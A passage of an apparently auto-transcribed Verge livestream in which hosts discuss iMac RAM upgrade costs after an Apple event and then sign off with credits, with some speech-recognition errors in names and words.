surprise when he was live blogging about
that as well that's Eric aliso need to
ramp up to 16 gigs yeah and how much how
much is that you're adding 200 bucks 200
bucks well if you're spending twenty
five hundred dollars on in computer I
guess you don't really care about 200
and and also I don't know if this is
still true I haven't checked in on
memory prices recently but it used to be
that you could save a ton of money by
just picking the base level of RAM
an imac and upgrading it yourself um
looking I'm actually like I'm pricing
everything out right now John is asking
John is that our producer is asking if
you can upgrade the memory yourself that
is actually a good question idea but it
used to be it certainly used to be that
that was the way to go just because it
was so much cheaper right and 32 gig is
how much 600 / base so if you want to
max out your imac Rona it's about forty
four hundred dollars peanuts pocket
change let's do it press the x button do
it yeah borrow your credit card utterly
unrelated to that I already goaded you
into into upgrading to which is not
really it's not yet ah I'm swimming
later today and soon as it does i will i
promise you guys i download it and break
my laptop and make it happen i think i'm
just about wraps up everything today
yeah wraps up most of the questions too
I've guys have anything other questions
and you want to hear any other news
about the show or about Apple in general
and check out the verge kamta nice
website it's a little pretty it's good
we're biased but but fairly so yeah um
one thing again dieter out of San
Francisco of course new line David also
there covering the event live the entire
time the entire crew here everyone
worsen video and product and sales and
everyone else in vox media all lovely
people yeah there's a just we should
have a credit roll yes that's that's
about it so guys thank you so much
ramara check out the verge calm for
anything else and we'll see you next
time
